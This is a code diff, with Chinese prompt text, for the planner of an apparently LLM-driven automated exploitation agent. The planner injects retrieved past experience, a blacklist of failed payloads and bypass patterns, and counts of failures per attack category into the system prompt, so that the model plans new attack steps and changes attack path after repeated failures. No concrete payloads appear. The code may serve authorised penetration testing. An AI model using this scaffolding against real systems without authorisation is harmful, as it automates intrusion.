+    lines.append("")
+    lines.append("以下技术在上轮执行中已被证伪。你在本轮【绝对禁止】以任何形式复现：")
+    lines.append("")
+
+    for i, f in enumerate(failures, 1):
+        step_id = f.get("step_id", "?")
+        error = f.get("error", "未知错误")
+        root_cause = f.get("root_cause", "")
+        lines.append(f"  🚫 禁止项 #{i}（上轮 step {step_id} — {error}）")
+        if root_cause:
+            lines.append(f"     根因: {root_cause}")
+        payload_text = f.get("payload", "")
+        if payload_text:
+            lines.append(f"     已证伪载荷: {payload_text[:200]}")
+
+    lines.append("")
+    lines.append("【强制反省要求】：")
+    lines.append("  1. 在 rationale 中逐项列出上述禁止项，并说明本轮如何避免")
+    lines.append("  2. 如果你在本轮生成了包含上述载荷的 step，你的计划将被直接拒绝")
+    lines.append("  3. 如果某个禁止项是本轮成功的关键，你必须设计全新的替代方案")
+    lines.append("  4. 若前序步骤（如获取 token）本身未完成，严禁构造依赖它的后续步骤")
+    lines.append("")
+
+    # Also extract bypass-level failures from patterns
+    pattern_patch = memory_patch.get("pattern", {})
+    failed_patterns = pattern_patch.get("add_patterns", [])
+    if failed_patterns:
+        lines.append("【已证伪的 bypass 模式】:")
+        for fp in failed_patterns:
+            fp_id = fp.get("id", "?")
+            fp_type = fp.get("type", "?")
+            fp_payload = fp.get("payload", "")
+            fp_desc = fp.get("description", "")
+            lines.append(f"  ❌ [{fp_type}] {fp_desc}: {fp_payload}")
+
+    lines.append("")
+    lines.append("╚══════════════════════════════════════════════════════════════╝")
+
+    return "\n".join(lines)
+
+
 def run_planner(
     settings: Settings,
     memory: LayeredMemory,
@@ -832,7 +1002,8 @@ def run_planner(
 
     vuln_summary = confirmed.get("title", "") or confirmed.get("description", "") or ""
 
-    memory_context = _build_memory_context(memory, vuln_summary)
+    # 🔑 RAG 检索：按 CWE + 漏洞描述 + 上轮报错精准匹配三层记忆
+    memory_context = _build_memory_context(memory, confirmed, feedback)
 
     user = {
         "confirmed_vuln": confirmed,
@@ -858,16 +1029,22 @@ def run_planner(
         out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
         return plan
 
+    # 🔑 失败指纹黑名单 — 前置注入，防幻觉复现
+    forbidden_block = ""
+    if feedback:
+        forbidden_block = _build_forbidden_techniques_block(feedback)
+        if forbidden_block:
+            system_prompt_with_memory = (
+                forbidden_block + "\n\n" + system_prompt_with_memory
+            )
+            print(f"[planner] 🚫 失败指纹黑名单已注入（{len(forbidden_block)} chars）")
+
+    # 🔑 长期记忆作为独立高权重模块，前置拼接到 System Prompt（确保 LLM 不会无视）
     if memory_context:
-        system_prompt_with_memory += f"""
-
-【长期记忆检索结果】
-系统已从你的历史经验库中检索到以下相关经验，请参考这些经验来制定攻击计划：
-
-{memory_context}
-
-请结合以上历史经验，选择最合适的攻击策略和技术手段。
-"""
+        system_prompt_with_memory = (
+            memory_context + "\n\n" + system_prompt_with_memory
+        )
+        print(f"[planner] 🧠 长期记忆已注入 system prompt（{len(memory_context)} chars）")
 
     if feedback:
         fb_planner = feedback.get("feedback_for_planner", "")
@@ -884,6 +1061,29 @@ def run_planner(
             fb_parts.append(f"feedback: {fb_planner}")
         if fb_errors:
             fb_parts.append(f"errors: {'; '.join(str(e) for e in fb_errors)}")
+
+        # 🔑 前轮 history_state 注入：强制 Planner 感知已尝试的 payload 历史
+        prior_history = feedback.get("prior_history_state")
+        if prior_history and isinstance(prior_history, dict):
+            tried = prior_history.get("tried_payloads", [])
+            failed = prior_history.get("failed_reasons", [])
+            cat_fails = prior_history.get("consecutive_failures_per_category", {})
+            history_lines = []
+            if tried:
+                history_lines.append(f"  🚫 已尝试的 Payload（严禁重复！）: {', '.join(tried)}")
+            if failed:
+                history_lines.append(f"  ❌ 历史失败原因: {'; '.join(failed)}")
+            if cat_fails:
+                cat_str = ", ".join(f"{k}={v}次" for k, v in cat_fails.items())
+                history_lines.append(f"  📊 分类失败计数: {cat_str}")
+                over_threshold = [k for k, v in cat_fails.items() if v >= 3]
+                if over_threshold:
+                    history_lines.append(
+                        f"  ⛔ 以下攻击路径已达失败上限，强制切换: {', '.join(over_threshold)}"
+                    )
+            if history_lines:
+                fb_parts.append("history_state:\n" + "\n".join(history_lines))
+
         system_prompt_with_memory += (
             "\n\n"
             "══════════════════════════════════════════\n"
